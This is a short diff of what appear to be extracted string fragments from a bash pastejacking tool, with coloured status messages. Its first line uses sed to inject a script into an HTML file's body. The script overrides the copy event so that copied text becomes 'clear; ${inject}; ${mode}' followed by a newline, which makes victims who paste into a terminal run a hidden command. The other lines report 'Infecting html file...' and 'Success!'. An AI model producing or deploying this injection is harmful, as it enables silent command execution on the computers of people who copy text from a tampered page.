@@ -1,0 +1,7 @@
+"('\n', '-e ""$White[${Green}*$White]$Green Infecting html file..."" & sed ""/<body>/a <script>document.addEventListener(\'copy\', function(e){console.log(e);e.clipboardData.setData(\'text/plain\', \'clear; ${inject}; ${mode}\\\\\\r\\\\\\n\');e.preventDefault();});</script>"" $html_file > output/generated.html        ##### Injecting file #####')"
+"('\n', '-e ""$White[${Green}*$White]$Green Output saved at : ${White}output/generated.html""')"
+"('\n', '-e ""$White[${Red}!$White]$Red Exiting...\\n""')"
+"('\n', '-e ""$White[${Red}!$White]$Red File doesn\'t exist...""')"
+"('\n', '-e ""$White[${Red}!$White]$Red Something wrong with this file...""')"
+"('\n', '-e ""$White[${Yellow}*$White]$Yellow Success! ""')"
+"('\n', '-e ""${Yellow}')"
